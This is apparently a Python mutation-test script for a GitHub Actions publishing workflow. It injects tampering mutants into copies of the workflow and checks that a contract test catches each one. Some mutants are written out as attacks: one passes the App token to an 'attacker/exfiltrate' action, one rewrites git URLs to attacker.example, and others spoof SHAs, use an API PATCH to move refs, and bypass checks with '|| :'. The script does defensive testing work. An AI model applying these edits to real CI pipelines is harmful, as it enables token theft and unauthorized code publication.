#!/usr/bin/env python3
"""Run the publisher contract test against workflow mutants; every mutant must be KILLED (test run fails).

Usage: contract_mutants.py <helper dir containing .github/ and tests/>
The helper dir itself is never modified: each mutant lives in a temporary copy.

The first nine mutants are the 2026-09-21 set. The F1/F2 mutants reproduce the 2026-09-23 independent
review's findings: with the fragment-only contract test they all SURVIVED; the strengthened test kills them.
"""

from __future__ import annotations

import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

helper = Path(sys.argv[1])
WORKFLOW = Path(".github/workflows/mission-spine-auth-smoke.yml")
TEST = "test_pipeline_defects_main_publish.py"
ATTACKER = "d" * 40
TAB = chr(92) + "t"
CONT = " " + chr(92) + "\n"
PUSH_STEP = "      - name: Fast-forward protected main to the exact tested pipeline-defects target\n        env:\n"
REAUTH_STEP = "      - name: Re-authenticate the published main\n        run: |\n"
TARGET_STEP = "      - name: Test the exact pipeline-defects target\n        working-directory: target\n        run: |\n          set -euo pipefail\n"
SANDBOX_ROW = f"            $'M{TAB}apps/devpath-sandbox-svc/base/deployment.yaml'" + CONT
NONEMPTY = '          test -n "$expected_listing"\n'
COMPARE = '          test "$target_listing" = "$expected_listing"\n'
# 2026-09-23 review anchors (each occurs exactly once in the reviewed workflow).
PUSH_LINE = '          git -C gitops-main push origin "$TARGET_SHA:refs/heads/main"\n'
PRE_PUSH_FETCH = (
    "          git -C gitops-main fetch --no-tags origin main:refs/remotes/origin/main\n"
    '          test "$(git -C gitops-main rev-parse origin/main)" = "$MAIN_SHA"\n'
)
MINT_END = "          permission-administration: read\n          permission-contents: write\n\n"
TREE_PIN = "          test \"$(git rev-parse 'HEAD^{tree}')\" = \"$TARGET_TREE\"\n"
PARENT_PIN = '          test "$(git rev-list --parents -n 1 HEAD)" = "$TARGET_SHA $MAIN_SHA"\n'
APPROVER_LINE = "          test \"$(jq -r '.[0].user.login' <<<\"$approvals_json\")\" = \"$APPROVER_LOGIN\"\n"
REPO_LINE = "          repository: DevPathAi/devpath-gitops\n"
RUNS_ON = "    runs-on: ubuntu-24.04\n"
ATTEMPT_LINE = '          test "$GITHUB_RUN_ATTEMPT" = "1"\n'
TOKEN_REF = "${{ steps.app_token.outputs.token }}"
API_PATCH = (
    '          python -c "import os,urllib.request as u; u.urlopen(u.Request('
    "'https://api.github.com/repos/DevPathAi/devpath-gitops/git/'+'refs/heads/main', method='PATCH', "
    "headers={'Authorization':'Bearer '+os.environ['GH_TOKEN']}))\"\n"
)


def run_tests(root: Path) -> bool:
    done = subprocess.run(
        [sys.executable, "-B", "-m", "unittest", "discover", "-s", "tests/release", "-p", TEST],
        cwd=root, capture_output=True, text=True, encoding="utf-8", errors="replace",
    )
    return done.returncode == 0


def mutant(label: str, old: str, new: str) -> bool:
    with tempfile.TemporaryDirectory(prefix="contract-mutant-") as scratch:
        root = Path(scratch) / "helper"
        shutil.copytree(helper, root, ignore=shutil.ignore_patterns("__pycache__"))
        path = root / WORKFLOW
        text = path.read_bytes().decode("utf-8")
        assert text.count(old) == 1, (label, text.count(old))
        path.write_bytes(text.replace(old, new).encode("utf-8"))
        survived = run_tests(root)
    print(f"[{'SURVIVED' if survived else 'killed'}] {label}")
    return not survived


assert run_tests(helper), "the unmutated helper must pass its own contract test"
print("[ok] unmutated helper passes")
killed = [
    mutant("step env shadows TARGET_SHA on the push step", PUSH_STEP, PUSH_STEP + f"          TARGET_SHA: {ATTACKER}\n"),
    mutant(
        "step env shadows TARGET_SHA and TARGET_TREE on the re-authentication step",
        REAUTH_STEP,
        REAUTH_STEP.replace("        run: |\n", f"        env:\n          TARGET_SHA: {ATTACKER}\n          TARGET_TREE: {ATTACKER}\n        run: |\n"),
    ),
    mutant("strict mode removed from the target test step", TARGET_STEP, TARGET_STEP.replace("          set -euo pipefail\n", "")),
    mutant("strict mode weakened to `set +e` in the target test step", TARGET_STEP, TARGET_STEP.replace("set -euo pipefail", "set +e")),
    mutant("one expected row dropped from the pinned listing", SANDBOX_ROW, ""),
    mutant("the expected listing may be empty", NONEMPTY, ""),
    mutant("the whole-listing comparison removed", COMPARE, ""),
    mutant("the expected listing is reassigned from the target listing before the comparison",
           COMPARE, '          expected_listing="$target_listing"\n' + COMPARE),
    mutant("the comparison is weakened to a prefix match",
           COMPARE, '          [[ "$target_listing" == "$expected_listing"* ]]\n'),
    # F1 - the token-bearing steps were pinned only by fragments.
    mutant("F1-M1: TARGET_SHA reassigned in the push step right before the push", PUSH_LINE, f"          TARGET_SHA={ATTACKER}\n" + PUSH_LINE),
    mutant("F1-M1b: TARGET_SHA exported in the push step right before the push", PUSH_LINE, f"          export TARGET_SHA={ATTACKER}\n" + PUSH_LINE),
    mutant("F1-M1c: TARGET_SHA rewritten with printf -v right before the push", PUSH_LINE, f"          printf -v TARGET_SHA '%s' {ATTACKER}\n" + PUSH_LINE),
    mutant("F1-M2: an unknown pinned action receives the App token after the mint", MINT_END,
           MINT_END + f"      - uses: attacker/exfiltrate@{ATTACKER}\n        with:\n          token: {TOKEN_REF}\n\n"),
    mutant("F1-M3: a second push spelled pu\"\"sh escapes the push regex", PUSH_LINE,
           f'          git -C gitops-main pu""sh origin {ATTACKER}:refs/heads/main\n' + PUSH_LINE),
    mutant("F1-M4: the ref is moved through the API with a split 'git/refs' literal", PRE_PUSH_FETCH, API_PATCH + PRE_PUSH_FETCH),
    mutant("F1-M6: the App-authority checkout points at another repository", REPO_LINE, "          repository: attacker/devpath-gitops\n"),
    mutant("F1-M8: an insteadOf rewrite redirects the push before it happens", PUSH_LINE,
           "          git -C gitops-main config url.https://attacker.example/.insteadOf https://github.com/\n" + PUSH_LINE),
    mutant("F1-M11: the job moves to a self-hosted runner", RUNS_ON, "    runs-on: self-hosted\n"),
    mutant("F1-M13: the mint asks for workflows: write as well", MINT_END,
           "          permission-administration: read\n          permission-contents: write\n          permission-workflows: write\n\n"),
    mutant("F1-M14: an extra run step appears after the mint", MINT_END,
           MINT_END + "      - name: An extra step after the mint\n        run: |\n          set -euo pipefail\n          echo extra\n\n"),
    # F2 - `set -e` escapes that leave the asserted fragment intact.
    mutant("F2-M5: the tree pin is followed by ` || :`", TREE_PIN, TREE_PIN[:-1] + " || :\n"),
    mutant("F2-M5b: the tree pin is preceded by `true || `", TREE_PIN, "          true || " + TREE_PIN.lstrip()),
    mutant("F2-M5c: the parent pin is followed by ` || :`", PARENT_PIN, PARENT_PIN[:-1] + " || :\n"),
    mutant("F2-M10: the approver-login check is followed by ` || :`", APPROVER_LINE, APPROVER_LINE[:-1] + " || :\n"),
    mutant("F2-M15: the attempt-one check is followed by ` || :`", ATTEMPT_LINE, ATTEMPT_LINE[:-1] + " || :\n"),
]
print(f"killed {sum(killed)} of {len(killed)}")
raise SystemExit(0 if all(killed) else 1)
